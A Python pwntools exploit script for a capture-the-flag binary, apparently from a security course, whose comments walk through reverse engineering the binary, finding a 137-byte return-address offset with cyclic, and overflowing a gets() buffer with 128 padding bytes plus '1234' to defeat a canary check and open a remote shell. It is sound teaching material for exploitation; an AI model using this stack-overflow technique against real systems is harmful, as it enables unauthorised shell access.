#!/usr/bin/env python3
from pwn import *

# Before creating the script:
# Since there is no source code, I first opened binary ninja to get a better understanding of what the program does.
# The main function simply calls the 'check_canary' function. In 'check_canary',
# two values are compared using strncmp, and if they are equal I get shell access.

# The first value pushed to be compared is at address 0x804a00c, which we know holds 
# the value "1234" from the binary ninja comment. The other value pushed is what is in
# register eax, which we can see from the binary ninja comment is at address 'var_9'.
# When binary ninja gives the label 'var_9', this means it is stored 0x9 (or 9 bytes) 
# above (or before) the return address stored in the EIP register.

# NOTE: It is alot clearer and easier to interpret this when using the 'High Level IL' option found
# in the bottom right corner of binary ninja, which attempts to convert the assembly to source code.

# Hence, to overwrite the second value pushed to strncmp to be equal to "1234", we need to determine
# the offset of the return address from our buffer, and then relative to the return addresses position
# insert the string "1234" 9 bytes before

# To determine the offset the return address in EIP is from our buffer, 
# we use cyclic 300 in pwndbg. Then, we input this sequence when gets asks for input.
# When we run the rest of the binary, it tries to return to an overwritten address
# and displays 'Invalid address 0x6b626161'. When doing cyclic -l 0x6b626161,
# we get the result 137, which tells us the return address has an offset of 137 bytes.

# Hence, since the value we want to overwrite is 9 bytes above the return address,
# we can write 137 - 9 = 128 bytes of anything, followed by the string "1234" to match the other stored value.

# The script:
p = remote("plsdonthaq.me", 2003)

# The byte string we send as input to gets is 128 bytes of anything followed by the string 1234
p.sendline(flat({
  128: "1234"
  }))

# and once we have access to the shell, we can retrieve the flag in the terminal
p.interactive()